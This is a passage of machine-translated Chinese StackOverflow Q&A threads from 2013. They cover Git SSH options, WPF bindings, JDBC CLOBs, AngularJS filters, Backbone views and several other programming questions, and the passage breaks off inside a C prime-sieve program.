    <script type="text/javascript" src="http://netdna.bootstrapcdn.com/twitter-bootstrap/2.2.2/js/bootstrap.min.js"></script>
    <script type="text/javascript">
        $(document).ready(function () {
        });
    </script>
</head>
<body>
    <div class="container-fluid">
        <div class="row-fluid">
            <div class="span12">
                <ul id="top-nav" class="nav">
                    <li data-current-nav="Home"><a href="/Home">Home</a></li>
                </ul>
            </div>
        </div>
    </div>

    <div class="container-fluid">
        <div class="row-fluid">
            <div class="span12">
                bottom content
            </div>
        </div>
    </div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T17:48:01.033

尝试删除`margin-bottom`on `ul#top-nav`：

```
#top-nav {
    margin-bottom: 0 !important;
} 
```

请参阅更新的 jsFiddle 进行演示 > [http://jsfiddle.net/6pbPd/1/](http://jsfiddle.net/6pbPd/1/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-08T17:53:19.637

您应该删除 (20px) 的底部边距`ul.nav`和应用于`min-height`容器`div`(30px) 的规则：

```
.row-fluid [class*="span"] {
   min-height: 20px;
}

#top-nav {
    margin-bottom: 0;
} 
```

演示：http: [//jsfiddle.net/6pbPd/4/](http://jsfiddle.net/6pbPd/4/)

# git - 使用 GIT_SSH 错误的自定义 SSH 克隆 Git

> ID：14220929
> 
> 赞同：56
> 
> 时间：2013-01-08T17:41:07.460
> 
> 标签：git, ssh, environment-variables, clone, git-clone

我正在尝试使用自定义 SSH 命令克隆 Git 存储库。我在 GIT_SSH 环境中设置 SSH 命令可变地运行

`export GIT_SSH="/usr/bin/ssh -o StrictHostKeyChecking=no -i /home/me/my_private_key"`.

但是，在上一个命令之后，我运行

`git clone git@bitbucket.org:uname/test-git-repo.git`，我收到以下奇怪的错误

```
error: cannot run /usr/bin/ssh -o StrictHostKeyChecking=no -i /home/me/my_private_key
fatal: unable to fork 
```

你能帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：102
> 
> 时间：2013-01-08T17:47:17.280

您不能在`GIT_SSH`环境变量中提供选项；从`git`手册页：

```
 GIT_SSH
       If this environment variable is set then git fetch and git push will use this command instead of ssh when they need to connect
       to a remote system. The $GIT_SSH command will be given exactly two arguments: the username@host (or just host) from the URL
       and the shell command to execute on that remote system.

       To pass options to the program that you want to list in GIT_SSH you will need to wrap the program and options into a shell
       script, then set GIT_SSH to refer to the shell script. 
```

`.ssh/config`一种选择是使用适当的配置将节添加到您的文件中：

```
Host bitbucket.org
  StrictHostKeyChecking no
  IdentityFile /home/me/my_private_key 
```

另一种选择是指向`GIT_SSH`执行所需操作的 shell 脚本。例如，在 中`/home/me/bin/bitbucket_ssh`，输入：

```
#!/bin/sh
exec /usr/bin/ssh -o StrictHostKeyChecking=no -i /home/me/my_private_key "$@" 
```

然后`GIT_SSH`指向`/home/me/bin/bitbucket_ssh`。

我更喜欢`.ssh/config`尽可能使用，因为这避免了为每个远程创建每个目标脚本的需要。

* * *

## 回答 #2

> 赞同：31
> 
> 时间：2014-12-22T17:44:47.410

请注意，从 git 2.3+（2015 年第一季度）开始，您最初尝试的将使用新的环境变量`GIT_SSH_COMMAND`。

请参阅[Thomas Quinot (](https://github.com/quinot) [)](https://github.com/quinot)的[提交 3994276](https://github.com/git/git/commit/39942766ab9bc738f49f93d4c8ea68ffbaadc305)：[`quinot`](https://github.com/quinot)

## `git_connect`: 设置 ssh shell 命令`GIT_SSH_COMMAND`

> `GIT_SSH`当需要传递其他参数时，安装包装脚本可能是不切实际的。
> 通过环境变量提供另一种指定要运行的 shell 命令（包括命令行参数）的方法，该`GIT_SSH_COMMAND`变量的行为类似于`GIT_SSH`但**传递给 shell**。
> 
> 在使用 PuTTY 的 plink/tortoiseplink 的情况下修改参数的特殊电路仅在使用时激活`GIT_SSH`；在 using 的情况下`GIT_SSH_COMMAND`，故意让用户在调用底层 ssh 实现之前进行任何所需的参数适配。

## `GIT_SSH_COMMAND`：

> 如果设置了这些环境变量中的任何一个，则“ `git fetch`”和“ ”将在需要连接到远程系统时`git push`使用指定的命令而不是“ ”。 该命令将给出两个或四个参数：`ssh`
> 
> *   URL中的 ' `username@host`' （或只是 ' `host`'）和要在该远程系统上执行的 shell 命令，可选地前面有 ' `-p`' （字面意思）和
> *   当它指定默认端口`port`以外的其他内容时，来自 URL的“ ”。`SSH`
> 
> `$GIT_SSH_COMMAND`优先于`$GIT_SSH`, 并由 shell 解释，允许包含其他参数。
> `$GIT_SSH`另一方面，它必须只是程序的路径（如果需要额外的参数，它可以是一个包装器 shell 脚本）。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2018-01-01T13:36:47.473

基于[larsk](https://stackoverflow.com/users/147356/larsks)的[回答](https://stackoverflow.com/a/14221028/110488)和[VonC](https://stackoverflow.com/users/6309/vonc)的[回答](https://stackoverflow.com/a/27607760/110488)，您可以创建一个`git_ssh.sh`脚本，例如：

```
#!/bin/sh
# Workaround: GIT_SSH_COMMAND isn't supported by Git < 2.3
exec ${GIT_SSH_COMMAND:-ssh} "$@" 
```

然后像这样调用你的`git`命令：

```
export GIT_SSH_COMMAND="/usr/bin/ssh -o StrictHostKeyChecking=no -i /home/me/my_private_key"
export GIT_SSH=path/to/git_ssh.sh
git ... 
```

**这是它的工作原理：**

在 Git v2.3+`$GIT_SSH_COMMAND`​​ 中优先于`$GIT_SSH`，但旧版本根本不尊重`$GIT_SSH_COMMAND`。

`$GIT_SSH`只能保存`ssh`系统上命令的路径。它不能向该命令传递额外的命令行参数，那么我们如何将额外的参数传递给`ssh`?

一种解决方法是创建一个包含`ssh`命令及其额外参数的脚本。这正是 the`git_ssh.sh`的全部内容：由于我们已经设置`$GIT_SSH_COMMAND`为 be `/usr/bin/ssh -o StrictHostKeyChecking=no -i /home/me/my_private_key`，这正是我们需要的`exec`，并且这里是为了将Git 本身`"$@"`传递给的参数传递给`git_ssh.sh``$GIT_SSH_COMMAND.`

该`${...:-ssh}`部分虽然不是严格需要的，但它是一个很好的接触，它将`$GIT_SSH_COMMAND`默认为`ssh`命令，因此设置`GIT_SSH=git_ssh.sh`不会破坏正常`git`执行。

作为附加值，Git v2.3+​​ 完全忽略了这个脚本，`$GIT_SSH_COMMAND`在这种情况下直接使用。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2014-05-12T06:52:41.227

使用 ssh 代理

```
ssh-agent bash -c 'ssh-add /home/me/my_private_key; git clone git@bitbucket.org:uname/test-git-repo.git' 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2013-03-24T10:12:24.177

您可以提供任何您希望与 Git 命令一起使用的密钥文件，如下所示：

```
$ PKEY=~/.ssh/keyfile.pem git clone git@github.com:me/repo.git 
```

或这个：

```
$ git.sh -i ~/.ssh/keyfile.pem clone git@github.com:me/repo.git 
```

我在这里回答了同样的问题： [https ://stackoverflow.com/a/15596980](https://stackoverflow.com/a/15596980)

详情见链接。

# jquery - jscrollpane：当鼠标悬停在滚动条上时停止自动滚动

> ID：14220932
> 
> 赞同：0
> 
> 时间：2013-01-08T17:41:13.227
> 
> 标签：jquery, jscrollpane, jquery-jscrollpane

我使用以下脚本在页面加载时开始自动滚动

```
$(function(){

var pane = $('.wrapperContent');

pane.jScrollPane({
    horizontalDragMaxWidth: 86,
    horizontalDragMinWidth: 86,
    animateScroll: true,
    animateDuration : 20000
});

var api = pane.data('jsp');

api.scrollToX(parseInt(900));
return false;
}); 
```

但是当鼠标悬停在内容上时，我会停止自动滚动。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-13T18:58:18.073

我所做的是，我创建了一个计时器变量并将 autoReinitialise 设置设置为 TRUE。然后，我将计时器设置为我的功能并在悬停时将其清除。看一看：

```
var timer;
function autoScrollFunction() {
//your function to auto scroll
}
timer = setInterval(changeImageFeature);

$("#super_feature").hover(function () {
   clearInterval(timer); // stop the timer
} 
```

# c# - WPF 上的绑定错误（与 DataContext 绑定）

> ID：14220934
> 
> 赞同：0
> 
> 时间：2013-01-08T17:41:22.410
> 
> 标签：c#, wpf, binding

首先让我说我对 WPF 相当陌生，所以请原谅我犯了任何愚蠢的错误，但我已经为此苦苦挣扎了一段时间。

我有一个简单的解决方案，包含三个类：

```
public class MyCustomItem

public class MyCustomLayout : ThirdPartyLayout<MyCustomItem>

public class MyViewController : INotifyPropertyChanged 
```

MyCustomItem 是一个具有一些属性的简单类（“名称”就是其中之一）。ThirdPartyLayoutTool 是继承自 System.Windows.Controls.Panel 的 SDK 中的通用组件。MyViewController 是我用作数据内容的视图控制器。

然后我创建了这个简单的 XAML 作为项目主窗口：

```
<Window x:Class="DependencyViewer.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:sdk="clr-namespace:Sdk;assembly=Sdk"
    xmlns:local="clr-namespace:MyNamespace"
    Title="MainWindow" Height="350" Width="525">

    <local:MyCustomLayout x:Name="myLayout"/>
</Window> 
```

一切都相应地显示。现在我的目标是增强由 ThirdPartyLayout 面板显示的子组件之一的显示，称为 TargetControl。所以我添加以下代码：

```
<Window.Resources>
    <Style TargetType="{x:Type sdk:TargetControl}">
        <Style.Resources>
            <ToolTip x:Key="ToolTipContent">
                <StackPanel>
                    <TextBlock FontWeight="Bold" Text="Testing 1 2 3"/>
                    <TextBlock Text="{Binding Name}"/>
                </StackPanel>
            </ToolTip>
        </Style.Resources>
        <Setter Property="ToolTip" Value="{StaticResource ToolTipContent}"/>
    </Style>
</Window.Resources> 
```

当我运行代码时，“Testing 1 2 3”消息正确显示，但是，我没有看到 Name 属性。在输出窗口中，我收到以下消息：

`BindingExpression path error: 'Name' property not found on 'object' ''MyViewController' (HashCode=31884011)'`

我不明白为什么绑定发生在 MyViewController 类上，而不是 TargetControl 类上。有任何想法吗？

最好的问候，卡洛斯·乔丹

编辑：

主要根据newb给出的建议修修补补指导，最终发现错误的根源其实是在SDK中。当前版本仍然有问题，但是从源代码编译时，我得到了预期的行为。

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T18:00:58.283

在 XAML 中创建绑定时，默认情况下会绑定到当前 DataContext。在这种情况下，这似乎`MyViewController`是`sdk:TargetControl`. 要绑定到的`Name`属性`skd:TargetControl`，请尝试以下操作：

```
 <TextBlock Text="{Binding Name, RelativeSource={RelativeSource AncestorType={x:Type sdk:TargetControl}}}"/> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T18:03:24.897

似乎 MyViewController 的 xaml.cs 的 DataContext 有 MyCustomItem 的引用。

如果您愿意，可以在 xaml.cs 中设置 MyCustomLayout.ItemsSource = this.DataContext。

或者您可以执行 MyCustomLayout.ItemsSource = MyCustomItem 的特定属性。

# arrays - Bash：如何计算数组中的唯一值并检索具有最多重复项的值

> ID：14220952
> 
> 赞同：4
> 
> 时间：2013-01-08T17:42:21.637
> 
> 标签：arrays, bash

我有一个 bash 脚本，它将不同的宽度：高度值推到数组的末尾。一些值是重复的。我需要做的是遍历数组，计算数组中每个唯一值的出现次数，然后检索重复次数最多的值。

```
dimensions=( )
dimensions[${#dimensions[*]}]="450:180"
dimensions[${#dimensions[*]}]="360:240"
dimensions[${#dimensions[*]}]="360:240"
dimensions[${#dimensions[*]}]="640:480"
dimensions[${#dimensions[*]}]="360:240"
dimensions[${#dimensions[*]}]="640:480" 
```

在上面的数组中，我需要检索值“360:240”，因为有 3 个重复项。如何计算唯一值并最终得到一个包含数组中重复次数最多的值的变量？

```
mostDuplicates="360:240" 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T17:50:28.743

Bash 版本 4 具有关联数组：

```
#! /bin/bash
dimensions=(
    450:180
    360:240
    360:240
    640:480
    360:240
    640:480)

declare -A count
max=0

for d in ${dimensions[@]} ; do
    if (( ++count[$d] > max )) ; then
        max=${count[$d]}
        winner=$d
    fi
done
echo Winner: $winner, $max times 
```

# java - 如何使用在 Oracle JDBC 的存储过程中定义的 IN OUT CLOB 参数？

> ID：14220954
> 
> 赞同：3
> 
> 时间：2013-01-08T17:42:23.603
> 
> 标签：java, oracle, jdbc

我定义了以下存储过程：

```
CREATE OR REPLACE PROCEDURE NOTIFY_INSERT (
  FLAG IN VARCHAR2,
  MESSAGE IN OUT CLOB,
  SEQ_NO OUT NUMBER
) 
AS
BEGIN
...
END; 
```

现在我试图在 JDBC 中调用这个存储过程。但是，我得到一个异常说“java.sql.SQLException：参数类型冲突”。这是从线上提出的

```
call.execute(); 
```

我猜它与第二个参数有关，它是一个 CLOB。

**有谁知道我做错了什么？**

谢谢你的帮助。

```
Connection connection = dataSource.getConnection();
CallableStatement call = null;
try {
    call = connection.prepareCall("{ call NOTIFY_INSERT (?,?,?) }");
    call.setString(1, flag);
    call.registerOutParameter(2, Types.CLOB);
    call.setString(2, message);
    call.registerOutParameter(3, Types.NUMERIC);
    call.execute();
    sequenceNo = call.getLong(3);
    message = call.getString(2);
} catch (SQLException e) {
    e.printStackTrace();
} finally {
    if (call != null) {
        try { call.close(); } catch (SQLException sqle) {}
    }
} 
```

JDBC 异常：

```
java.sql.SQLException: Parameter Type Conflict
    at oracle.jdbc.driver.OraclePreparedStatement.processCompletedBindRow(OraclePreparedStatement.java:2480)
    at oracle.jdbc.driver.OraclePreparedStatement.executeInternal(OraclePreparedStatement.java:4356)
    at oracle.jdbc.driver.OraclePreparedStatement.execute(OraclePreparedStatement.java:4595)
    at oracle.jdbc.driver.OracleCallableStatement.execute(OracleCallableStatement.java:10100)
    at oracle.jdbc.driver.OraclePreparedStatementWrapper.execute(OraclePreparedStatementWrapper.java:5693)
    at org.apache.commons.dbcp.DelegatingPreparedStatement.execute(DelegatingPreparedStatement.java:172)
    at org.apache.commons.dbcp.DelegatingPreparedStatement.execute(DelegatingPreparedStatement.java:172) 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-08T19:11:00.927

我不认为您可以将字符串直接传递给 CLOB 类型的参数。尝试绑定 CLOB 参数时，可以执行以下操作：

如果您已经有一个`Clob`：

```
call.setClob(1, clob); 
```

如果要将 a 转换`String`为 a `Clob`：

```
call.setCharacterStream(1, new StringReader(string), string.length()); 
```

如果要设置空 CLOB：

```
call.setNull(1, Types.CLOB); 
```

你也可以看到[这个解决方案](https://stackoverflow.com/questions/678060/execute-sql-statement-via-jdbc-with-clob-binding)。

# android - 如何在带有片段的布局中的列表视图下方的页脚中添加按钮

> ID：14220956
> 
> 赞同：1
> 
> 时间：2013-01-08T17:42:37.883
> 
> 标签：android, android-layout

如何在带有片段的布局中的列表视图下方的页脚中添加按钮。我有如下代码：

在片段 java.

```
ListView listview;
Button button;

public View onCreateView(LayoutInflater inflater, ViewGroup container,
            Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.category, container, false);
        View footerView = inflater.inflate(R.layout.footer_category, null);
        listview = (ListView) view.findViewById(R.id.categoryNewsItemGrid);
        listview.addFooterView(footerView);

    loadmore = (Button) footerView.findViewById(R.id.loadMore);
    loadmore.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View arg0) {
            Log.d("Mylog","Button can click");
        }
    });

        return view;
} 
```

/res/layout/category.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <ListView
        android:id="@+id/categoryNewsItemGrid"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:divider="#C5C5C5"
        android:dividerHeight="2px" />

</LinearLayout> 
```

/res/layout/footer_category.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/footerCategory"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content">

    <Button
        android:id="@+id/loadMore"
        android:layout_width="fill_parent"
        android:text="Load More" />

</LinearLayout> 
```

我得到错误（强制关闭），如果我在 logcat 中看到，我在第 74 行收到消息错误 Android 运行时，第 74 行是：

```
View footerView = inflater.inflate(R.layout.footer_category, null); 
```

我的问题，我想在列表视图下方的页脚中添加按钮。就像[这个截图](http://www.androidhive.info/wp-content/uploads/2012/05/output_listview_loadmore_button.png)一样。谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:57:41.050

您错过`layout_height`了`/res/layout/footer_category.xml`：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/footerCategory"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content">

    <Button
        android:id="@+id/loadMore"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:text="Load More" />

</LinearLayout> 
```

# java - 如何比较从 java 到 mysql 时间戳字段的日期

> ID：14220957
> 
> 赞同：2
> 
> 时间：2013-01-08T17:42:39.617
> 
> 标签：java, jpa, ejb, eclipselink

很抱歉再次发布同样的问题，但我很想知道。

我想知道我们如何将 java 中的当前日期与 mysql 中存储的日期进行比较。

存储在 MySQL 中的日期是`2013-01-04 13:15:00`

当我通过获取当前日期在java中比较这个日期时

```
Date date = new Date(); 
```

然后写一个查询，如果存储在 MySQL 中的日期小于当前显示结果。但查询在列表中返回 0 结果或异常我已在最后粘贴异常。

```
select model from abc model where model.abcStartDate &lt;= :? and model.abcEndDate &gt;= :? 
```

在 ”：？” date 是通过 MySQL 中的开始日期和结束日期是时间戳数据类型的。

下面是EJB实体类

```
@Entity
@Table(name = "abc_table", uniqueConstraints = {})
public class ABCClass implements java.io.Serializable {

private static final long serialVersionUID = -1924961655993587546L;

// Fields
private Date abcStartDate;
private Date abcEndDate;

// Constructors

/** default constructor */
public ABCClass() {
}

@OrderBy(value="3")
@Temporal(TemporalType.TIMESTAMP)
@Column(name = "abc_start_date", unique = false, nullable = false, insertable = true, updatable = true, length = 19)
public Date getabcStartDate() {
    return this.abcStartDate;
}

public void setabcStartDate(Date abcStartDate) {
    this.abcStartDate = abcStartDate;
}

@OrderBy(value="4")
@Temporal(TemporalType.TIMESTAMP)
@Column(name = "abc_end_date", unique = false, nullable = false, insertable = true, updatable = true, length = 19)
public Date getabcEndDate() {
    return this.abcEndDate;
}

public void setabcEndDate(Date abcEndDate) {
    this.abcEndDate = abcEndDate;
}

} 
```

它抛出一个异常

```
Exception thrown from bean; nested exception is: Exception [EclipseLink-3001] (Eclipse Persistence Services - 2.2.1.v20110722-r9776): org.eclipse.persistence.exceptions.ConversionException
Exception Description: The object [65464533565], of class [class java.lang.String], could not be converted to [class java.lang.Integer].
Internal Exception: java.lang.NumberFormatException: For input string: "65464533565" 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-08T18:28:01.610

JPQL 中的日期比较可以通过以下方式完成。

如果您要与当前日期和时间进行比较

```
select model from abc model where model.abcStartDate >= CURRENT_TIMESTAMP 
and model.abcEndDate >= CURRENT_TIMESTAMP 
```

或创建查询并传递参数

```
query = em.createQuery("select model from abc model where model.abcStartDate >= 
:time and model.abcEndDate >= :time");
query.setParameter("time", new Date(), TemporalType.TIMESTAMP); 
```

# tfs - 在 win 2003 服务器上安装 TFS Express

> ID：14220961
> 
> 赞同：0
> 
> 时间：2013-01-08T17:42:49.100
> 
> 标签：tfs

我正在尝试在 win 2003 服务器（32 位）上设置 TFS express，但它抛出了这个错误

```
Error : TF400154: No se admite la instalación en esta versión de Windows.
Error : TF400155: Solamente se admiten versiones de 64 bits de Windows Server. 
```

已经在 WIN7（32 位）上安装了 TFS，它工作正常。

有没有办法在我的 win 2003 服务器机器上安装它？

* * *

翻译不好：

> 错误：TF400154：此版本的 Windows 上不允许安装。
> 错误：TF400155：只允许使用 64 位版本的 Windows Server。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-09T17:28:37.423

没办法安装，TFS 2012只能安装在64位服务器平台

```
Server operating systems:

   64-bit version of Windows Server 2008   with SP2

   64-bit versions of Windows Server 2008 R2 ¹ with SP1

   64-bit versions of Windows Server 2012 ² 
```

此处的完整要求：http: [//msdn.microsoft.com/en-us/library/vstudio/dd578592.aspx](http://msdn.microsoft.com/en-us/library/vstudio/dd578592.aspx)

# objective-c - 如何在调用结构时将值存储在 C 结构中而不会丢失它们

> ID：14220962
> 
> 赞同：0
> 
> 时间：2013-01-08T17:42:50.593
> 
> 标签：objective-c, static, struct

我定义了一个 C（Objective-C）结构：

```
struct ResultadoVentaPUP{
    NSString *autenticadoPorPin1;
    NSString *autenticadoPorPin2;
    NSString *tipoPago;
    NSString *importe;
}; 
```

**然后我全局**声明一个这种类型的变量（在文件顶部）：

```
ResultadoVentaPUP resven; 
```

在一个函数中，我为此结构设置值，例如：

```
resven.importe=@"12.45"; 
```

但是当我尝试在同一个文件的另一个函数中查看“importe”的内容时，ir 返回（null）。

```
NSLog(@"Result: %@",resven.importe); 
```

我究竟做错了什么？我应该用“静态”定义结构吗？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-08T17:58:54.987

无论如何，现在将 Obj-C 对象存储在 C 结构中是一个相当糟糕的主意，使用 ARC（自动引用计数），它甚至不再被允许（如果你这样做，编译器会抱怨）。为什么不使用对象呢？如果您因为担心开销而不想使用评估器方法，只需使用带有公共 ivars 的对象。公共 ivars 恕我直言，但结构与具有公共 ivars 的对象几乎相同。

```
@interface ResultadoVentaPUP : NSObject
{
    @public
    NSString * autenticadoPorPin1;
    NSString * autenticadoPorPin2;
    NSString * tipoPago;
    NSString * importe;
}
@end

@implementation ResultadoVentaPUP
@end

ResultadoVentaPUP * resven;

void someFunction () {
    resven = [[ResultadoVentaPUP alloc] init];
    resven->importe = @"12.45";
}

void someOtherFunction () {
    NSLog(@"Result: %@",resven->importe);
} 
```

如果您使用 ARC，此代码也会很好地工作，并且迟早每个项目都应该在不久的将来迁移到 ARC（只要它可以放弃对没有 ARC 支持的 OSX/iOS 版本的支持）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:59:26.717

也许您的声明应该是`struct ResultadoVentaPUP resven;`. 这对我有用：

```
#import <Foundation/Foundation.h>

struct ResultadoVentaPUP{
    NSString *autenticadoPorPin1;
    NSString *autenticadoPorPin2;
    NSString *tipoPago;
    NSString *importe;
};

struct ResultadoVentaPUP resven;

void func1() {
    resven.importe = @"12.45";
}

void func2() {
    NSLog(@"Result: %@", resven.importe);
}

int main(int argc, char *argv[]) {
    NSAutoreleasePool *p = [[NSAutoreleasePool alloc] init];

    func1();
    func2();

    [p release];
} 
```

如果我没有提醒您在使用全局变量时应该认真重新考虑您的设计，那我就是失职了。

# angularjs - AngularJS 试图理解 js 过滤器

> ID：14220964
> 
> 赞同：5
> 
> 时间：2013-01-08T17:42:59.367
> 
> 标签：angularjs

试图理解 AngularJS 的“过滤器”功能，大多数示例在视图/HTML 端都有过滤器，但我在控制器/JS 端需要它。

这有效

```
 $scope.getPickedPeopleCount = function(){
    var thisCount = 0;
    angular.forEach($scope.allPeople, function(person){
      if(person.PICKED){thisCount++}
    });
    return thisCount;
  } 
```

但这失败了

```
 $scope.getPickedPeopleCount = function(){
    return $scope.allPeople.filter(PICKED:'true').length;
  } 
```

显然我的语法是错误的，有人能指出我正确的方向吗

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-01-08T18:11:32.173

要在控制器中使用过滤器，您必须注入 $filter 服务，然后按名称请求过滤器：

```
function MyCtrl ( $scope, $filter ) {
  var filter = $filter('filter'); // could be orderBy, etc.

  // more code...

  $scope.getPickedPeopleCount = function () {
    return filter( $scope.allPeople, { PICKED: 'true' } ).length;
  }
} 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2013-01-08T20:08:47.467

除了@Josh 的回答之外，过滤器（预定义的 Angular 过滤器和您自己的自定义过滤器）也可以使用*filterName*过滤器语法注入到控制器、指令、自定义过滤器等中。例如，filterFilter、dateFilter、myCoolSortFilter 等。来自[$filterProvider](http://docs.angularjs.org/api/ng.%24filterProvider)文档：

> 过滤器函数在 $injector 中注册，过滤器名称后缀为`Filter`.

通过这种方式，您可以更具体地了解实际依赖项（尽管注入 $filter 可以让您访问所有 Angular 过滤器）。

```
function MyCtrl ( $scope, filterFilter ) {
  // more code...

  $scope.getPickedPeopleCount = function () {
    return filterFilter( $scope.allPeople, { PICKED: 'true' } );
  }
} 
```

# backbone.js - 如何将模板传递给 Backbone 中的视图

> ID：14220966
> 
> 赞同：1
> 
> 时间：2013-01-08T17:43:02.843
> 
> 标签：backbone.js, backbone-views

我正在尝试将模板传递给我的视图。我有几个不同的模板要使用，并希望能够在我的路由器中切换它们。我没有得到任何错误，但我没有得到任何结果。看起来`initialize`在我的第二个视图中没有调用该方法。这是我的代码：

```
 (function() {
        window.App = {
            Models: {},
            Collections: {},
            Views: {},
            Router: {}
        };

        window.template = function(id) {
            return _.template( $('#' + id).html() );
        };

        var vent = _.extend({}, Backbone.Events);

        _.templateSettings.interpolate = /\[\[(.+?)\]\]/g;

        App.Router = Backbone.Router.extend({
            routes: {
                '' : 'index',
                'send-message' : 'sendMessage',
                '*other' : 'other'
            },
            index: function() {
                t = new (App.Collections.Tables.extend({ url: 'main-contact'}))();
                tables = new (App.Views.Tables.extend({
     collection: t, template: template('mainContactTemplate')}))();
                $('#web-leads').html(tables.el);
            },
            sendMessage: function() {
                t = new (App.Collections.Tables.extend({ url: 'send-message'}))();
                tables = new App.Views.Tables.extend({
     collection: t, template: template('sendMessageTemplate')});
                $('#web-leads').html(tables.el);
            },
            other: function() {

            }
        });

        // Main Contact
        App.Models.Table = Backbone.Model.extend({});

        App.Collections.Tables = Backbone.Collection.extend({
            model: App.Models.Table,
            initialize: function(models, options) {
                this.fetch({
                    success: function(data) {
                        //console.log(data.models);
                    }
                });
                if (options) {
                    this.url = this.url || options.url;
                }
            }
        });

        App.Views.Tables = Backbone.View.extend({
            tagName: 'ul',
            initialize: function() {
                this.collection.on('reset', this.render, this);
            },
            render: function() {
                return this.collection.each(this.addOne, this);
            },
            addOne: function(model) {
                var t = new App.Views.Table({ model: model, template: template});
                this.$el.append(t.render().el);
                return this;
            }
        });

        App.Views.Table = Backbone.View.extend({
            tagName: 'li',
            template: this.template,
            initialize: function (attrs) {
                this.options = attrs;
                console.log(this.options);
            },
            render: function() {
                this.$el.html(this.template(this.model.toJSON()));
                return this;
            }
        });

        new App.Router();
        Backbone.history.start();
    })(); 
```

编辑：我错过了一些括号。但现在我得到一个无法识别的表达式的错误。现在正在调用初始化。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-08T17:59:24.557

你这样做的方式`App.Views.Table`是（据我所知）在 Backbone 中使用模板的“标准”方式。当然，有几种选择，而且每个人都说它们都不是“错误的”。

话虽如此，您的代码中确实存在一些问题。让我们从：

```
template: this.template, 
```

在代码运行时，您不在 的实例中`App.Views.Tables`，而是在全局空间中声明一个（稍后）将用于创建实例的类。但在那一刻，`this`只是指`window`。您真正想要做的是在您的 中设置模板`initialize`，这导致我：

```
initialize: function(options) {
     this.template = options.template;
}, 
```

但是还有最后一个问题：

```
var t = new App.Views.Table({ model: model, template: template}); 
```

该函数中没有模板变量，所以你真的在做`template: undefined`. 那应该使用真正的模板。

话虽如此，您可能只想考虑将模板直接放在视图上，就像您尝试的那样：

```
template: Handlebars.compile('<span>{{test}}</span>'), 
```

毕竟，任何给定的视图都应该始终使用相同的模板，对吧？此外，您可能需要考虑移动：

```
render: function() {
    this.$el.html(this.template(this.model.toJSON()));
    return this;
} 
```

到父类中，这样您就可以在所有模板视图之间共享它，而不必重复它。

# oracle - Toplink xml 描述符参考

> ID：14220967
> 
> 赞同：1
> 
> 时间：2013-01-08T17:43:06.777
> 
> 标签：oracle, file-descriptor, toplink

我对 Toplink 很陌生。我正在维护的当前项目是新的。

该项目有一个 1 MB 文件大小的项目描述符（xml 项目描述符）。当我用 Toplink 工作台打开它时，需要 10 分钟。另一个比我年长的开发人员告诉我，他没有使用工作台，而是使用任何 xml 编辑器（只是记事本++）修改描述符。

但是没有使用 xml 描述符的 toplink 参考。所有教程和文档都是用于使用工作台，并通过 UI 进行修改，然后将其保存到 xml。

您知道关于 toplink 的 xml 描述符的任何参考吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-21T15:22:44.017

您可以使用 project.xml 的 XML 模式 XSD 作为参考，或者使用安装中提供的示例。

XSD 应位于 TopLink 安装的 /xsd 目录中。

project.xml 的 EclipseLink XSD 类似，您可以在此处查看它们，

[http://wiki.eclipse.org/EclipseLink/XSDs](http://wiki.eclipse.org/EclipseLink/XSDs)

# winapi - Win32 API：读取文件超时

> ID：14220968
> 
> 赞同：1
> 
> 时间：2013-01-08T17:43:07.290
> 
> 标签：winapi, timeout

如何为 ReadFile 和 WriteFile 操作设置超时，

使用进程间管道时？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-08T17:48:45.857

您必须通过指定来使用函数的异步版本`FILE_FLAG_OVERLAPPED`。

达到超时时，您可以`CancelIO`使用文件句柄进行调用。

# c - 使用位掩码使用 Sieve 方法列出素数

> ID：14220971
> 
> 赞同：2
> 
> 时间：2013-01-08T17:43:09.747
> 
> 标签：c, arrays, primes, bitmask, sieve-of-eratosthenes

我使用 Sieve 的方法编写了以下代码来列出所有最多 20 亿个素数。我使用位掩码进行标记。虽然我能够正确获得素数，但每次都会丢失开头的几个素数。请帮我找出程序中的错误。

```
#include <stdio.h>
#include <stdlib.h>
#include <math.h>
#include <stdbool.h>

#define MAX 2000000000

char* listPrimes(){
int block = sqrt(MAX);
char* mark = calloc((MAX/8),sizeof(char));
int i = 2;
int j;
char mask[8];
for(j=0;j<8;j++)
    mask[j] = 0;
mask[7] = 1;
mask[6] |= mask[7] << 1;
